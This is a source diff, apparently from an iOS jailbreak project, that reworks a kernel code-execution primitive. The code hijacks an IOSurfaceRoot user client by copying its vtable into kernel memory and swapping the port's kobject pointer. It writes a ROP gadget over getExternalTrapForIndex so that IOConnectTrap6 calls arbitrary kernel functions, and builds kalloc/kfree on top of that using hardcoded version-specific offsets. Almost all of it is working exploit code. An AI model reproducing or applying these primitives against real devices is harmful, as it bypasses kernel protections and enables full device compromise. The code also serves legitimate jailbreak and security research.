@@ -119,121 +119,130 @@ void kreadbuf(uint64_t kaddr, void* output, size_t size)
     }
 }
 
+uint64_t zm_fix_addr_kalloc(uint64_t addr) {
+    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8; guess what is that address xD
+    uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
+    uint64_t zm_alloc = kread64(kmem);    //idk?
+    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;
+
+    return (zm_stripped | ((addr) & 0xffffffff));
+}
+
 //Thanks @Mineek!
-mach_port_t user_client;
-uint64_t fake_client;
-
-// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
- uint64_t dirty_kalloc(size_t size) {
-     uint64_t begin = get_kernproc();//kfd_struct->info.kernel.kernel_proc;
-     uint64_t end = begin + 0x40000000;
-     uint64_t addr = begin;
-     while (addr < end) {
-         bool found = false;
-         for (int i = 0; i < size; i+=4) {
-             uint32_t val = kread32(addr+i);
-             found = true;
-             if (val != 0) {
-                 found = false;
-                 addr += i;
-                 break;
-             }
-         }
-         if (found) {
-             printf("[+] dirty_kalloc: 0x%llx\n", addr);
-             return addr;
-         }
-         addr += 0x1000;
-     }
-     if (addr >= end) {
-         printf("[-] failed to find free space in kernel\n");
-         exit(EXIT_FAILURE);
-     }
-     return 0;
- }
-
-void init_kcall(void) {
-     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-     if (service == IO_OBJECT_NULL){
-       printf(" [-] unable to find service\n");
-       exit(EXIT_FAILURE);
-     }
-     kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
-     if (err != KERN_SUCCESS){
-       printf(" [-] unable to get user client connection\n");
-       exit(EXIT_FAILURE);
-     }
-    printf("user_client: 0x%lx\n", user_client);
-     uint64_t uc_port = port_name_to_ipc_port(user_client);//find_port(user_client);
-     printf("Found port: 0x%llx\n", uc_port);
-     uint64_t uc_addr = kread64(uc_port + 0x58);//0x58 = OFFSET(ipc_port, ip_kobject));
-     printf("Found addr: 0x%llx\n", uc_addr);
-    printf("pid? %d\n", kread32(uc_addr + 0x8));
-     uint64_t uc_vtab = kread64(uc_addr);
-     printf("Found vtab: 0x%llx\n", uc_vtab);
-     uint64_t fake_vtable = dirty_kalloc(0x1000);
-     printf("Created fake_vtable at %016llx\n", fake_vtable);
-     for (int i = 0; i < 0x200; i++) {
-         kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
-     }
-     printf("Copied some of the vtable over\n");
-     fake_client = dirty_kalloc(0x1000);
-     printf("Created fake_client at 0x%016llx\n", fake_client);
-     for (int i = 0; i < 0x200; i++) {
-         kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
-     }
-     printf("Copied the user client over\n");
-     kwrite64(fake_client, fake_vtable);
-     kwrite64(uc_port + 0x58, fake_client);//0x58 = OFFSET(ipc_port, ip_kobject));
-     uint64_t add_x0_x0_0x40_ret = off_add_x0_x0_0x40_ret;
-    printf("off_add_x0_x0_0x40_ret: 0x%llx, kslide: 0x%x\n", off_add_x0_x0_0x40_ret, get_kslide());
-     add_x0_x0_0x40_ret += get_kslide();
-    printf("kread64 ret: 0x%llx\n", kread64(add_x0_x0_0x40_ret));
-    //b7, b8, b6
-//    for(int i = 0; i < 1000; i++) {
-//        kwrite64(fake_vtable+8*(0xb8 + i*2), add_x0_x0_0x40_ret);
-//    }
-     kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
-     printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
- }
-
- uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-     uint64_t offx20 = kread64(fake_client+0x40);
-     uint64_t offx28 = kread64(fake_client+0x48);
-     kwrite64(fake_client+0x40, x0);
-     kwrite64(fake_client+0x48, addr);
-     printf("user_client: 0x%lx\n", user_client);
-     uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-     kwrite64(fake_client+0x40, offx20);
-     kwrite64(fake_client+0x48, offx28);
-     return returnval;
- }
-
-uint64_t ZmFixAddr(uint64_t addr) {
-    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
+uint64_t init_kcall(uint64_t *_fake_vtable, uint64_t *_fake_client, mach_port_t *_user_client) {
+    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
     
-    if (zm_hdr.start == 0) {
-        // xxx rk64(0) ?!
-        uint64_t zone_map = kread64(off_zone_map + get_kslide());
-        printf("zone_map kread64: 0x%llx\n", zone_map);
-        // hdr is at offset 0x10, mutexes at start
-        kreadbuf(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
-        //printf("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
-        
-        if (zm_hdr.start == 0 || zm_hdr.end == 0) {
-            printf("[-] KernelRead of zone_map failed!\n");
-//            return 1;
-        }
-        
-        printf("zm_hdr.end: 0x%llx, zm_hdr.start: 0x%llx\n", zm_hdr.end, zm_hdr.start);
-        
-//        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
-//            printf("[-] zone_map is too big, sorry.\n");
-//            return 1;
-//        }
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    if (service == IO_OBJECT_NULL){
+      printf(" [-] unable to find service\n");
+      exit(EXIT_FAILURE);
     }
-    
-    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
-    
-    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
+    mach_port_t user_client;
+    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
+    if (err != KERN_SUCCESS){
+      printf(" [-] unable to get user client connection\n");
+      exit(EXIT_FAILURE);
+    }
+    uint64_t uc_port = port_name_to_ipc_port(user_client);
+    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF
+    uint64_t uc_vtab = kread64(uc_addr);
+    uint64_t fake_vtable = off_empty_kdata_page;
+    for (int i = 0; i < 0x200; i++) {
+        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
+    }
+    uint64_t fake_client = off_empty_kdata_page + 0x1000;
+    for (int i = 0; i < 0x200; i++) {
+        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
+    }
+    kwrite64(fake_client, fake_vtable);
+    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF
+    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+
+    *_fake_vtable = fake_vtable;
+    *_fake_client = fake_client;
+    *_user_client = user_client;
+
+    return 0;
+}
+
+uint64_t init_kcall_allocated(uint64_t _fake_vtable, uint64_t _fake_client, mach_port_t *_user_client) {
+    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
+
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+    if (service == IO_OBJECT_NULL){
+      printf(" [-] unable to find service\n");
+      exit(EXIT_FAILURE);
+    }
+    mach_port_t user_client;
+    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
+    if (err != KERN_SUCCESS){
+      printf(" [-] unable to get user client connection\n");
+      exit(EXIT_FAILURE);
+    }
+    uint64_t uc_port = port_name_to_ipc_port(user_client);
+    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
+    uint64_t uc_vtab = kread64(uc_addr);
+    uint64_t fake_vtable = _fake_vtable;
+    for (int i = 0; i < 0x200; i++) {
+        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
+    }
+    uint64_t fake_client = _fake_client;
+    for (int i = 0; i < 0x200; i++) {
+        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
+    }
+    kwrite64(fake_client, fake_vtable);
+    kwrite64(uc_port + 0x58, fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF (0x68)
+    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+
+    *_user_client = user_client;
+
+    return 0;
+}
+
+uint64_t kcall(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+    uint64_t offx20 = kread64(fake_client+0x40);
+    uint64_t offx28 = kread64(fake_client+0x48);
+    kwrite64(fake_client+0x40, x0);
+    kwrite64(fake_client+0x48, addr);
+    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+    kwrite64(fake_client+0x40, offx20);
+    kwrite64(fake_client+0x48, offx28);
+    return returnval;
+}
+
+uint64_t kalloc(mach_port_t user_client, uint64_t fake_client, size_t ksize) {
+    uint64_t allocated_kmem = kcall(user_client, fake_client, off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
+    return zm_fix_addr_kalloc(allocated_kmem);
+}
+
+void kfree(mach_port_t user_client, uint64_t fake_client, uint64_t kaddr, size_t ksize) {
+    kcall(user_client, fake_client, off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
+}
+
+uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
+    for(int i = 0; i < size; i+=8) {
+        kwrite64(addr + i, 0);
+    }
+    return 0;
+}
+
+int kalloc_using_empty_kdata_page(uint64_t* _fake_vtable, uint64_t* _fake_client) {
+    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
+
+    uint64_t fake_vtable, fake_client = 0;
+    mach_port_t user_client = 0;
+    init_kcall(&fake_vtable, &fake_client, &user_client);
+
+    uint64_t allocated_kmem = kalloc(user_client, fake_client, 0x1000);
+    *_fake_vtable = allocated_kmem;
+
+    allocated_kmem = kalloc(user_client, fake_client, 0x1000);
+    *_fake_client = allocated_kmem;
+
+    mach_port_deallocate(mach_task_self(), user_client);
+
+    clean_dirty_kalloc(fake_vtable, 0x1000);
+    clean_dirty_kalloc(fake_client, 0x1000);
+
+    return 0;
 }
